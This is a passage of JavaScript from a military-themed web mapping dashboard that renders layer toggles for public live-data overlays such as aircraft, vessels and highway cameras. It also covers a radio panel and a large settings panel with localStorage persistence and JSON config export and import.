                    ${s.favicon ? `<img src="${s.favicon}" class="radio-favicon" onerror="this.style.display='none'">` : ''}
                </div>`;
            }).join('');
        }

        return `
            <div class="panel-section">
                <div class="panel-section-title">📡 SCAN ZONE</div>
                <div style="font-family:var(--font-mono);font-size:0.65rem;color:var(--text-dim);line-height:2;padding:4px 0;">
                    STATUS: <span style="color:${scanActive ? 'var(--primary)' : 'var(--danger)'};">${scanActive ? '● ACTIVE' : '○ NOT DEFINED'}</span><br>
                    ${scanActive ? `SIZE: <span style="color:var(--primary);">${scanInfo}</span><br>` : ''}
                    ${!scanActive ? '<span style="color:var(--warning);font-size:0.55rem;">Use the SCAN tool to draw a<br>rectangle where you want to<br>load live data.</span>' : ''}
                </div>
                ${scanActive ? `
                    <button class="btn btn-primary" style="width:100%;margin-bottom:6px;" onclick="window.SGP.reloadData()">↻ RELOAD DATA</button>
                    <button class="btn btn-secondary" style="width:100%;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.clearScanZone()">✕ CLEAR SCAN ZONE</button>
                ` : `
                    <button class="btn btn-primary" style="width:100%;" onclick="window.SGP.startScan()">📡 DEFINE SCAN ZONE</button>
                `}
            </div>
            <div class="panel-section">
                <div class="panel-section-title">BASE LAYERS</div>
                <div class="layer-toggle" data-layer="tactical"><div class="layer-toggle-label"><span>🗺️</span><span>Dark Tactical</span></div><div class="toggle-switch ${state.mapLayers.tactical ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="satellite"><div class="layer-toggle-label"><span>🛰️</span><span>Satellite</span></div><div class="toggle-switch ${state.mapLayers.satellite ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="terrain"><div class="layer-toggle-label"><span>⛰️</span><span>Topographic</span></div><div class="toggle-switch ${state.mapLayers.terrain ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="nightvision"><div class="layer-toggle-label"><span>🌙</span><span>Night Vision</span></div><div class="toggle-switch ${state.mapLayers.nightvision ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="greyops"><div class="layer-toggle-label"><span>🔘</span><span>Grey Operations</span></div><div class="toggle-switch ${state.mapLayers.greyops ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="streetintel"><div class="layer-toggle-label"><span>🛣️</span><span>Street Intel</span></div><div class="toggle-switch ${state.mapLayers.streetintel ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="hybrid"><div class="layer-toggle-label"><span>🌐</span><span>Hybrid (Sat + Labels)</span></div><div class="toggle-switch ${state.mapLayers.hybrid ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="watercolor"><div class="layer-toggle-label"><span>🎨</span><span>Relief / Watercolor</span></div><div class="toggle-switch ${state.mapLayers.watercolor ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="maritime"><div class="layer-toggle-label"><span>⚓</span><span>Maritime (Bathymetry)</span></div><div class="toggle-switch ${state.mapLayers.maritime ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="natgeo"><div class="layer-toggle-label"><span>🌍</span><span>National Geographic</span></div><div class="toggle-switch ${state.mapLayers.natgeo ? 'active' : ''}"></div></div>
            </div>
            <div class="panel-section">
                <div class="panel-section-title">LIVE DATA OVERLAYS</div>
                <div class="layer-toggle" data-layer="traffic"><div class="layer-toggle-label"><span>🚗</span><span>Traffic / Vehicles</span></div><div class="toggle-switch ${state.mapLayers.traffic ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="cellTowers"><div class="layer-toggle-label"><span>📡</span><span>Cell Towers</span></div><div class="toggle-switch ${state.mapLayers.cellTowers ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="infrastructure"><div class="layer-toggle-label"><span>🏛️</span><span>Infrastructure</span></div><div class="toggle-switch ${state.mapLayers.infrastructure ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="cameras"><div class="layer-toggle-label"><span>📹</span><span>Surveillance Cameras</span></div><div class="toggle-switch ${state.mapLayers.cameras ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="aircraft"><div class="layer-toggle-label"><span>✈️</span><span>Air Traffic (Live)</span></div><div class="toggle-switch ${state.mapLayers.aircraft ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="vessels"><div class="layer-toggle-label"><span>⚓</span><span>Vessels (AIS Live)</span></div><div class="toggle-switch ${state.mapLayers.vessels ? 'active' : ''}"></div></div>
                <div class="layer-toggle" data-layer="highwayCams"><div class="layer-toggle-label"><span>📷</span><span>Live Highway CCTV</span></div><div class="toggle-switch ${state.mapLayers.highwayCams ? 'active' : ''}"></div></div>
            </div>
            <div class="panel-section">
                <div class="panel-section-title">LIVE STATISTICS</div>
                <div style="font-family:var(--font-mono);font-size:0.65rem;color:var(--text-dim);line-height:2;">
                    🚗 VEHICLES: <span style="color:#ffdd44;">${state.liveStats.vehicles}</span><br>
                    📡 TOWERS: <span style="color:#ff6400;">${state.liveStats.towers}</span><br>
                    🏛️ INFRA: <span style="color:#00b4ff;">${state.liveStats.infra}</span><br>
                    📹 CAMERAS: <span style="color:#ff9900;">${state.liveStats.cameras}</span><br>
                    ✈️ AIRCRAFT: <span style="color:#ff44ff;">${state.liveStats.aircraft}</span><br>
                    ⚓ VESSELS: <span style="color:#00ffcc;">${state.liveStats.vessels}</span><br>
                    📷 CCTV: <span style="color:#66ffcc;">${state.liveStats.highwayCams}</span><br>
                    🛣️ ROADS: <span style="color:var(--primary);">${state.roads.length}</span>
                </div>
            </div>
            ${(() => {
                const catKeys = Object.keys(state.cameraCatalog);
                if (catKeys.length === 0) return '';
                return `
                    <div class="panel-section">
                        <div class="panel-section-title">📹 SURVEILLANCE FEED CATALOG (${catKeys.length})</div>
                        <div style="display:flex;flex-direction:column;gap:4px;max-height:180px;overflow-y:auto;">
                            ${catKeys.slice(0, 15).map(id => {
                                const c = state.cameraCatalog[id];
                                return `
                                    <div style="display:flex;align-items:center;justify-content:space-between;background:rgba(0,255,65,0.05);padding:4px 8px;border-radius:4px;border:1px solid rgba(0,255,65,0.15);">
                                        <div style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-primary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:180px;">
                                            ${c.title} <span style="color:var(--text-dim);">(${c.type})</span>
                                        </div>
                                        <button class="btn btn-primary" style="padding:2px 6px;font-size:0.55rem;" onclick="window.SGP.openCameraModalById('${c.id}')">
                                            👁️ VIEW
                                        </button>
                                    </div>
                                `;
                            }).join('')}
                        </div>
                    </div>
                `;
            })()}
            <div class="panel-section">
                <div class="panel-section-title">🌡️ WEATHER</div>
                <div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);line-height:1.8;">
                    Click anywhere on the map in PAN mode<br>to see real-time weather data.
                </div>
            </div>
            <div class="panel-section">
                <div class="panel-section-title">📻 INTERNATIONAL RADIO</div>
                ${state.radioPlaying ? `
                    <div class="radio-now-playing">
                        <span class="radio-pulse">●</span> NOW PLAYING
                        <button class="btn btn-secondary" style="padding:4px 10px;font-size:0.5rem;margin-left:auto;" onclick="window.SGP.stopRadio()">⏹ STOP</button>
                    </div>
                    <div style="display:flex;align-items:center;gap:6px;margin:6px 0;">
                        <span style="font-size:0.6rem;">🔈</span>
                        <input type="range" min="0" max="1" step="0.05" value="0.7" style="flex:1;accent-color:var(--primary);" oninput="window.SGP.setRadioVolume(parseFloat(this.value))">
                        <span style="font-size:0.6rem;">🔊</span>
                    </div>
                ` : ''}
                <button class="btn btn-primary" style="width:100%;margin-bottom:8px;" onclick="window.SGP.loadRadio()">
                    📻 LOAD STATIONS (by map location)
                </button>
                <div style="font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);margin-bottom:6px;">
                    ${state.radioStations.length > 0 ? `${state.radioStations.length} stations available` : 'Move the map to a country, then press load'}
                </div>
                <div class="radio-list">
                    ${radioHTML}
                </div>
            </div>
        `;
    }

    window.SGP.startScan = function() {
        closePanel();
        selectTool('scan');
    };

    window.SGP.reloadData = function () {
        loadAllData();
        showToast('RELOADING LIVE DATA...');
    };

    function initLayerToggles() {
        document.querySelectorAll('.layer-toggle').forEach(toggle => {
            toggle.addEventListener('click', () => {
                const layer = toggle.dataset.layer;
                const switchEl = toggle.querySelector('.toggle-switch');

                var baseLayers = ['tactical', 'satellite', 'terrain', 'nightvision', 'greyops', 'streetintel', 'hybrid', 'watercolor', 'maritime', 'natgeo'];
                if (baseLayers.includes(layer)) {
                    baseLayers.forEach(l => {
                        state.mapLayers[l] = false;
                        if (state.tileLayers[l]) state.map.removeLayer(state.tileLayers[l]);
                    });
                    // Remove hybrid labels overlay if present
                    if (state.tileLayers._hybridLabels) state.map.removeLayer(state.tileLayers._hybridLabels);
                    state.mapLayers[layer] = true;
                    state.tileLayers[layer].addTo(state.map);
                    // Add labels overlay for hybrid mode
                    if (layer === 'hybrid' && state.tileLayers._hybridLabels) {
                        state.tileLayers._hybridLabels.addTo(state.map);
                    }
                    document.querySelectorAll('.layer-toggle').forEach(t => {
                        const tLayer = t.dataset.layer;
                        if (baseLayers.includes(tLayer)) {
                            t.querySelector('.toggle-switch').classList.toggle('active', state.mapLayers[tLayer]);
                        }
                    });
                } else {
                    state.mapLayers[layer] = !state.mapLayers[layer];
                    switchEl.classList.toggle('active');

                    if (layer === 'traffic') {
                        state.trafficActive = state.mapLayers.traffic;
                        if (state.mapLayers.traffic) {
                            state.vehicleLayer.addTo(state.map);
                            loadRoads();
                        } else {
                            state.map.removeLayer(state.vehicleLayer);
                        }
                    } else if (layer === 'cellTowers') {
                        if (state.mapLayers.cellTowers) {
                            loadCellTowers();
                        } else {
                            state.cellTowerMarkers.forEach(m => state.map.removeLayer(m));
                            state.cellTowerMarkers = [];
                        }
                    } else if (layer === 'infrastructure') {
                        if (state.mapLayers.infrastructure) {
                            loadInfrastructure();
                        } else {
                            state.infraMarkers.forEach(m => state.map.removeLayer(m));
                            state.infraMarkers = [];
                        }
                    } else if (layer === 'cameras') {
                        if (state.mapLayers.cameras) {
                            loadCameras();
                        } else {
                            state.cameraMarkers.forEach(m => state.map.removeLayer(m));
                            state.cameraMarkers = [];
                            state.cameras = [];
                            state.liveStats.cameras = 0;
                        }
                    } else if (layer === 'aircraft') {
                        if (state.mapLayers.aircraft) {
                            loadAircraft();
                        } else {
                            state.aircraftMarkers.forEach(m => state.map.removeLayer(m));
                            state.aircraftMarkers = [];
                            state.aircraftData = [];
                            if (state.aircraftRefreshInterval) { clearInterval(state.aircraftRefreshInterval); state.aircraftRefreshInterval = null; }
                            state.liveStats.aircraft = 0;
                        }
                    } else if (layer === 'vessels') {
                        if (state.mapLayers.vessels) {
                            startAISStream();
                        } else {
                            stopAISStream();
                        }
                    } else if (layer === 'highwayCams') {
                        if (state.mapLayers.highwayCams) {
                            loadHighwayCams();
                        } else {
                            state.highwayCamMarkers.forEach(m => state.highwayCamLayer.removeLayer(m));
                            state.highwayCamMarkers = [];
                            state.highwayCams = [];
                            state.liveStats.highwayCams = 0;
                        }
                    } else if (layer === 'grid') {
                        document.getElementById('grid-label').classList.toggle('hidden', !state.mapLayers.grid);
                    }
                }
                saveLayerSettings();
            });
        });
    }

    function renderSettingsPanel() {
        var cfg = state.appSettings || {};
        // Toggle HTML helper
        function tog(key, label, desc) {
            var val = cfg[key] !== undefined ? cfg[key] : true;
            return '<div class="route-tactical-toggle"><label style="display:flex;align-items:center;gap:8px;cursor:pointer;flex:1;"><input type="checkbox" ' + (val ? 'checked' : '') + ' onchange="window.SGP.setSetting(\'' + key + '\', this.checked)"><div style="flex:1;"><div style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-primary);letter-spacing:0.5px;">' + label + '</div>' + (desc ? '<div style="font-family:var(--font-mono);font-size:0.45rem;color:var(--text-dim);margin-top:2px;">' + desc + '</div>' : '') + '</div></label></div>';
        }
        function sel(key, label, options, curr) {
            var opts = options.map(function(o) { return '<option value="' + o.v + '" ' + (curr === o.v ? 'selected' : '') + '>' + o.l + '</option>'; }).join('');
            return '<div style="display:flex;align-items:center;justify-content:space-between;padding:6px 0;"><span style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-primary);letter-spacing:0.5px;">' + label + '</span><select onchange="window.SGP.setSetting(\'' + key + '\', this.value)" style="background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:6px 8px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.55rem;min-width:100px;">' + opts + '</select></div>';
        }
        function slider(key, label, min, max, val, unit) {
            return '<div style="padding:4px 0;"><div style="display:flex;justify-content:space-between;margin-bottom:4px;"><span style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-primary);letter-spacing:0.5px;">' + label + '</span><span style="font-family:var(--font-mono);font-size:0.55rem;color:var(--primary);">' + val + (unit||'') + '</span></div><input type="range" min="' + min + '" max="' + max + '" value="' + val + '" oninput="window.SGP.setSettingSlider(\'' + key + '\', parseInt(this.value), this)" style="width:100%;accent-color:var(--primary);"></div>';
        }
        function txt(key, label, placeholder, val) {
            return '<div style="display:flex;flex-direction:column;gap:4px;padding:6px 0;"><span style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-primary);letter-spacing:0.5px;">' + label + '</span><input type="text" value="' + (val || '') + '" placeholder="' + placeholder + '" onchange="window.SGP.setSetting(\'' + key + '\', this.value)" style="background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:6px 8px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.55rem;width:100%;"></div>';
        }
        // Storage calc
        var storageUsed = 0;
        try { for (var k in localStorage) { if (k.startsWith('sgp_')) storageUsed += localStorage.getItem(k).length; } } catch(e){}
        var storageKB = (storageUsed / 1024).toFixed(1);

        return '' +
        // ——— MAP SETTINGS ———
        '<div class="panel-section"><div class="panel-section-title">🗺️ MAP SETTINGS</div>' +
            sel('defaultZoom', 'DEFAULT ZOOM', [{v:'8',l:'8 — Country'},{v:'10',l:'10 — Region'},{v:'12',l:'12 — City'},{v:'14',l:'14 — District'},{v:'16',l:'16 — Street'},{v:'18',l:'18 — Building'}], String(cfg.defaultZoom||12)) +
            sel('mapStyle', 'MAP STYLE', [{v:'dark',l:'Dark Tactical'},{v:'satellite',l:'Satellite'},{v:'terrain',l:'Terrain'},{v:'osm',l:'OpenStreetMap'}], cfg.mapStyle||'dark') +
            tog('doubleClickZoom', 'DOUBLE-CLICK ZOOM', 'Zoom in on double click') +
            tog('scrollWheelZoom', 'SCROLL WHEEL ZOOM', 'Zoom with mouse wheel') +
            tog('showZoomControl', 'ZOOM CONTROLS', 'Show +/- zoom buttons') +
            tog('autoSaveMapView', 'AUTO-SAVE MAP VIEW', 'Remember position on reload') +
        '</div>' +

        // ——— UI / INTERFACE ———
        '<div class="panel-section"><div class="panel-section-title">🎨 INTERFACE</div>' +
            sel('uiColor', 'ACCENT COLOR', [{v:'green',l:'🟢 Tactical Green'},{v:'blue',l:'🔵 Intel Blue'},{v:'red',l:'🔴 Hostile Red'},{v:'amber',l:'🟡 Alert Amber'},{v:'cyan',l:'🔷 Cyber Cyan'},{v:'white',l:'⚪ Arctic White'}], cfg.uiColor||'green') +
            slider('uiFontSize', 'UI FONT SCALE', 80, 130, cfg.uiFontSize||100, '%') +
            slider('panelOpacity', 'PANEL OPACITY', 60, 100, cfg.panelOpacity||95, '%') +
            sel('language', 'LANGUAGE', [{v:'en',l:'English'},{v:'es',l:'Español'},{v:'fr',l:'Français'},{v:'de',l:'Deutsch'},{v:'pt',l:'Português'}], cfg.language||'en') +
            tog('showCrosshair', 'CROSSHAIR OVERLAY', 'Center crosshair on map') +
            tog('showCompass', 'COMPASS WIDGET', 'Show compass on map') +
            tog('showInfoBar', 'INFO BAR', 'Show ALT/SPD/HDG bar') +
            tog('showCoords', 'TOP COORDINATES', 'Show coordinates in header') +
            tog('animationsEnabled', 'UI ANIMATIONS', 'Enable smooth animations') +
            tog('bootScreen', 'BOOT SCREEN', 'Show boot animation on start') +
        '</div>' +

        // ——— GPS & LOCATION ———
        '<div class="panel-section"><div class="panel-section-title">📡 GPS & LOCATION</div>' +
            sel('gpsAccuracy', 'GPS ACCURACY', [{v:'high',l:'High (Battery+)'},{v:'balanced',l:'Balanced'},{v:'low',l:'Low (Save Battery)'}], cfg.gpsAccuracy||'high') +
            slider('gpsUpdateInterval', 'UPDATE INTERVAL', 1, 30, cfg.gpsUpdateInterval||5, 's') +
            tog('gpsAutoCenter', 'AUTO-CENTER ON GPS', 'Map follows your position') +
            tog('gpsTrackRecord', 'TRACK RECORDING', 'Record GPS tracks') +
            tog('gpsShowAccuracyCircle', 'ACCURACY CIRCLE', 'Show GPS accuracy radius') +
            tog('gpsWakelock', 'KEEP SCREEN ON', 'Prevent screen sleep while tracking') +
        '</div>' +

        // ——— UNITS & FORMATS ———
        '<div class="panel-section"><div class="panel-section-title">📐 UNITS & FORMATS</div>' +
            sel('unitDistance', 'DISTANCE', [{v:'metric',l:'Metric (km/m)'},{v:'imperial',l:'Imperial (mi/ft)'},{v:'nautical',l:'Nautical (nm)'}], cfg.unitDistance||'metric') +
            sel('unitSpeed', 'SPEED', [{v:'kmh',l:'km/h'},{v:'mph',l:'mph'},{v:'knots',l:'Knots'},{v:'ms',l:'m/s'}], cfg.unitSpeed||'kmh') +
            sel('unitCoords', 'COORDINATES', [{v:'dms',l:'DMS (40°26\'46\"N)'},{v:'dd',l:'Decimal (40.4462)'},{v:'dm',l:'Deg-Min (40°26.77\')'}], cfg.unitCoords||'dms') +
            sel('unitAltitude', 'ALTITUDE', [{v:'m',l:'Meters'},{v:'ft',l:'Feet'}], cfg.unitAltitude||'m') +
            sel('timeFormat', 'TIME FORMAT', [{v:'24h',l:'24-Hour'},{v:'12h',l:'12-Hour (AM/PM)'}], cfg.timeFormat||'24h') +
            sel('dateFormat', 'DATE FORMAT', [{v:'iso',l:'YYYY-MM-DD'},{v:'eu',l:'DD/MM/YYYY'},{v:'us',l:'MM/DD/YYYY'}], cfg.dateFormat||'iso') +
        '</div>' +

        // ——— DATA SOURCES ———
        '<div class="panel-section"><div class="panel-section-title">🔄 DATA & SOURCES</div>' +
            slider('dataRefreshInterval', 'REFRESH INTERVAL', 10, 300, cfg.dataRefreshInterval||60, 's') +
            slider('maxVehicles', 'MAX VEHICLES', 50, 500, cfg.maxVehicles||200, '') +
            slider('minZoomForData', 'MIN ZOOM FOR DATA', 8, 16, cfg.minZoomForData||12, '') +
            sel('overpassEndpoint', 'OVERPASS SERVER', [{v:'auto',l:'Auto (Best)'},{v:'de',l:'Germany (DE)'},{v:'kumi',l:'Kumi Systems'},{v:'ru',l:'Russia (RU)'}], cfg.overpassEndpoint||'auto') +
            tog('autoLoadData', 'AUTO-LOAD DATA', 'Load data when map moves') +
            tog('cacheOverpassData', 'CACHE API DATA', 'Cache responses locally') +
            txt('aisApiKey', 'AISSTREAM API KEY (VESSELS)', 'e.g. 22a8deca...', cfg.aisApiKey || (window.SGP_CONFIG && window.SGP_CONFIG.aisApiKey) || '') +
        '</div>' +

        // ——— NOTIFICATIONS ———
        '<div class="panel-section"><div class="panel-section-title">🔔 NOTIFICATIONS</div>' +
            tog('notifySound', 'NOTIFICATION SOUND', 'Play sound on alerts') +
            tog('notifyVibrate', 'VIBRATION', 'Vibrate on alerts (mobile)') +
            slider('toastDuration', 'TOAST DURATION', 1, 10, cfg.toastDuration||3, 's') +
            tog('notifyGPSLost', 'GPS SIGNAL LOST', 'Alert when GPS is lost') +
            tog('notifySOSConfirm', 'SOS CONFIRMATION', 'Require confirm for SOS') +
        '</div>' +

        // ——— PERFORMANCE ———
        '<div class="panel-section"><div class="panel-section-title">⚡ PERFORMANCE</div>' +
            sel('renderQuality', 'RENDER QUALITY', [{v:'high',l:'High (Smooth)'},{v:'medium',l:'Medium'},{v:'low',l:'Low (Fast)'}], cfg.renderQuality||'high') +
            tog('hardwareAccel', 'HARDWARE ACCELERATION', 'Use GPU for rendering') +
            tog('reducedMotion', 'REDUCED MOTION', 'Reduce animations for battery') +
            tog('offlineMode', 'OFFLINE MODE', 'Use only cached data') +
            slider('mapMaxZoom', 'MAX ZOOM LEVEL', 16, 22, cfg.mapMaxZoom||19, '') +
        '</div>' +

        // ——— MARKERS & ROUTES ———
        '<div class="panel-section"><div class="panel-section-title">📌 MARKERS & ROUTES DEFAULTS</div>' +
            sel('defaultMarkerType', 'DEFAULT MARKER TYPE', [{v:'friendly',l:'🟢 Friendly'},{v:'hostile',l:'🔴 Hostile'},{v:'unknown',l:'🟡 Unknown'},{v:'neutral',l:'🔵 Neutral'},{v:'objective',l:'⭐ Objective'}], cfg.defaultMarkerType||'friendly') +
            slider('defaultRouteWeight', 'DEFAULT ROUTE WIDTH', 1, 8, cfg.defaultRouteWeight||3, 'px') +
            sel('defaultRouteColor', 'DEFAULT ROUTE COLOR', [{v:'#00b4ff',l:'🔵 Blue'},{v:'#00ff41',l:'🟢 Green'},{v:'#ff2d2d',l:'🔴 Red'},{v:'#ffaa00',l:'🟡 Yellow'},{v:'#ff44ff',l:'🟣 Magenta'},{v:'#ffffff',l:'⚪ White'}], cfg.defaultRouteColor||'#00b4ff') +
            sel('defaultRouteStyle', 'DEFAULT ROUTE STYLE', [{v:'solid',l:'Solid ——'},{v:'dashed',l:'Dashed - -'},{v:'dotted',l:'Dotted · ·'}], cfg.defaultRouteStyle||'dashed') +
            tog('autoSaveRoutes', 'AUTO-SAVE ROUTES', 'Save routes when switching tools') +
        '</div>' +

        // ——— STORAGE ———
        '<div class="panel-section"><div class="panel-section-title">💾 STORAGE & DATA</div>' +
            '<div style="padding:8px 0;"><div style="display:flex;justify-content:space-between;margin-bottom:6px;"><span style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-primary);">STORAGE USED</span><span style="font-family:var(--font-mono);font-size:0.55rem;color:var(--primary);">' + storageKB + ' KB</span></div>' +
            '<div style="width:100%;height:6px;background:var(--bg-tertiary);border-radius:3px;overflow:hidden;border:1px solid var(--border);"><div style="height:100%;width:' + Math.min((storageUsed/5242880)*100, 100).toFixed(1) + '%;background:linear-gradient(90deg,var(--primary-dark),var(--primary));border-radius:3px;"></div></div>' +
            '<div style="font-family:var(--font-mono);font-size:0.45rem;color:var(--text-dim);margin-top:4px;text-align:right;">~5 MB available</div></div>' +
            '<div style="display:flex;flex-direction:column;gap:6px;">' +
                '<button class="btn btn-primary" style="width:100%;" onclick="window.SGP.exportConfig()">📤 EXPORT ALL CONFIG</button>' +
                '<button class="btn btn-secondary" style="width:100%;" onclick="window.SGP.importConfig()">📥 IMPORT CONFIG</button>' +
                '<button class="btn btn-secondary" style="width:100%;" onclick="window.SGP.exportAllData()">💾 EXPORT ALL DATA</button>' +
                '<button class="btn btn-secondary" style="width:100%;" onclick="window.SGP.clearCache()">🧹 CLEAR CACHE</button>' +
                '<button class="btn btn-secondary" style="width:100%;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.clearAllAppData()">⚠️ CLEAR ALL APP DATA</button>' +
                '<button class="btn btn-secondary" style="width:100%;border-color:var(--warning);color:var(--warning);" onclick="window.SGP.resetSettings()">🔄 RESET TO DEFAULTS</button>' +
            '</div>' +
        '</div>' +

        // ——— ABOUT ———
        '<div class="panel-section"><div class="panel-section-title">ℹ️ ABOUT</div>' +
            '<div style="text-align:center;padding:12px 0;">' +
                '<img src="sgp-logo.png" alt="SGP" style="width:60px;height:60px;border-radius:12px;margin-bottom:10px;filter:drop-shadow(0 0 10px rgba(0,255,65,0.3));">' +
                '<div style="font-family:var(--font-display);font-size:0.85rem;color:var(--primary);letter-spacing:4px;margin-bottom:4px;">SGP TACTICAL</div>' +
                '<div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);letter-spacing:1px;margin-bottom:8px;">v3.0 — Tactical Planning Suite</div>' +
                '<div style="font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);line-height:1.8;">' +
                    'CLASSIFICATION: <span style="color:var(--warning);">RESTRICTED</span><br>' +
                    'DATUM: <span style="color:var(--primary);">WGS84</span><br>' +
                    'PROJECTION: <span style="color:var(--primary);">EPSG:3857</span><br>' +
                    'SOURCE: <span style="color:var(--primary);">OpenStreetMap</span><br>' +
                    'VEHICLES: <span style="color:var(--warning);">SIMULATED</span><br>' +
                    'LICENSE: <span style="color:var(--primary-dim);">PROPRIETARY</span>' +
                '</div>' +
            '</div>' +
        '</div>';
    }

    // =========================================
    // SETTINGS PERSISTENCE ENGINE
    // =========================================
    // Load settings on startup
    state.appSettings = sgpLoad('appSettings', {
        // Map
        defaultZoom: 12, mapStyle: 'dark', doubleClickZoom: true, scrollWheelZoom: true,
        showZoomControl: true, autoSaveMapView: true,
        // UI
        uiColor: 'green', uiFontSize: 100, panelOpacity: 95, language: 'en',
        showCrosshair: true, showCompass: true, showInfoBar: true, showCoords: true,
        animationsEnabled: true, bootScreen: true,
        // GPS
        gpsAccuracy: 'high', gpsUpdateInterval: 5, gpsAutoCenter: false, gpsTrackRecord: false,
        gpsShowAccuracyCircle: false, gpsWakelock: false,
        // Units
        unitDistance: 'metric', unitSpeed: 'kmh', unitCoords: 'dms', unitAltitude: 'm',
        timeFormat: '24h', dateFormat: 'iso',
        // Data
        dataRefreshInterval: 60, maxVehicles: 200, minZoomForData: 12, overpassEndpoint: 'auto',
        autoLoadData: true, cacheOverpassData: true, aisApiKey: (window.SGP_CONFIG && window.SGP_CONFIG.aisApiKey) || '',
        // Notifications
        notifySound: true, notifyVibrate: true, toastDuration: 3,
        notifyGPSLost: true, notifySOSConfirm: true,
        // Performance
        renderQuality: 'high', hardwareAccel: true, reducedMotion: false, offlineMode: false,
        mapMaxZoom: 19,
        // Markers & Routes defaults
        defaultMarkerType: 'friendly', defaultRouteWeight: 3, defaultRouteColor: '#00b4ff',
        defaultRouteStyle: 'dashed', autoSaveRoutes: true
    });

    function saveAppSettings() { sgpSave('appSettings', state.appSettings); }

    function applyAppSettings() {
        var cfg = state.appSettings;
        // UI Color theme
        var colorMap = {
            green: {p:'#00ff41',pd:'#00cc33',pk:'#006b1d',pg:'rgba(0,255,65,0.15)'},
            blue: {p:'#00b4ff',pd:'#0088cc',pk:'#004466',pg:'rgba(0,180,255,0.15)'},
            red: {p:'#ff4444',pd:'#cc2222',pk:'#661111',pg:'rgba(255,68,68,0.15)'},
            amber: {p:'#ffaa00',pd:'#cc8800',pk:'#664400',pg:'rgba(255,170,0,0.15)'},
            cyan: {p:'#00ffcc',pd:'#00cc99',pk:'#006644',pg:'rgba(0,255,204,0.15)'},
            white: {p:'#e0e0e0',pd:'#aaaaaa',pk:'#555555',pg:'rgba(224,224,224,0.15)'}
        };
        var c = colorMap[cfg.uiColor] || colorMap.green;
        document.documentElement.style.setProperty('--primary', c.p);
        document.documentElement.style.setProperty('--primary-dim', c.pd);
        document.documentElement.style.setProperty('--primary-dark', c.pk);
        document.documentElement.style.setProperty('--primary-glow', c.pg);
        // Font size
        document.documentElement.style.fontSize = (cfg.uiFontSize || 100) + '%';
        // Panel opacity
        document.documentElement.style.setProperty('--bg-panel', 'rgba(10,14,10,' + ((cfg.panelOpacity||95)/100) + ')');
        // Element visibility
        var crosshair = document.getElementById('crosshair');
        if (crosshair) crosshair.style.display = cfg.showCrosshair === false ? 'none' : '';
        var compass = document.getElementById('compass-widget');
        if (compass) compass.style.display = cfg.showCompass === false ? 'none' : '';
        var infoBar = document.getElementById('info-bar');
        if (infoBar) infoBar.style.display = cfg.showInfoBar === false ? 'none' : '';
        var coords = document.getElementById('coord-display');
        if (coords) coords.style.display = cfg.showCoords === false ? 'none' : '';
        // Animations
        if (cfg.reducedMotion || cfg.animationsEnabled === false) {
            document.documentElement.style.setProperty('--transition-speed', '0s');
        } else {
            document.documentElement.style.removeProperty('--transition-speed');
        }
    }

    // Settings handlers
    window.SGP.setSetting = function(key, value) {
        state.appSettings[key] = value;
        saveAppSettings();
        applyAppSettings();
        // Refresh panel to reflect changes
        if (state.panelOpen === 'settings') openPanel('settings');
    };

    window.SGP.setSettingSlider = function(key, value, el) {
        state.appSettings[key] = value;
        saveAppSettings();
        // Update the displayed value next to the slider
        var span = el.parentElement.querySelector('span:last-child');
        if (span) {
            var unit = '';
            if (key.indexOf('FontSize') > -1 || key.indexOf('Opacity') > -1) unit = '%';
            else if (key.indexOf('Interval') > -1 || key.indexOf('Duration') > -1) unit = 's';
            else if (key.indexOf('Weight') > -1) unit = 'px';
            span.textContent = value + unit;
        }
        applyAppSettings();
    };

    window.SGP.exportConfig = function() {
        var data = { settings: state.appSettings, layers: state.mapLayers, routeConfig: state.routeConfig, version: '3.0', exportDate: new Date().toISOString() };
        var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a'); a.href = url; a.download = 'sgp_config_' + Date.now() + '.json'; a.click();
        URL.revokeObjectURL(url);
        showToast('📤 CONFIG EXPORTED');
    };

    window.SGP.importConfig = function() {
        var input = document.createElement('input');
        input.type = 'file'; input.accept = '.json';
        input.onchange = function(e) {
            var file = e.target.files[0]; if (!file) return;
            var reader = new FileReader();
            reader.onload = function(ev) {
                try {
                    var data = JSON.parse(ev.target.result);
                    if (data.settings) { Object.assign(state.appSettings, data.settings); saveAppSettings(); }
                    if (data.layers) { Object.assign(state.mapLayers, data.layers); saveLayerSettings(); }
                    if (data.routeConfig) { Object.assign(state.routeConfig, data.routeConfig); sgpSave('routeConfig', state.routeConfig); }
                    applyAppSettings();
                    showToast('📥 CONFIG IMPORTED — Reload app for full effect');
                    if (state.panelOpen === 'settings') openPanel('settings');
                } catch(err) { showToast('⚠ Invalid config file'); }
            };
            reader.readAsText(file);
        };
        input.click();
    };

    window.SGP.exportAllData = function() {
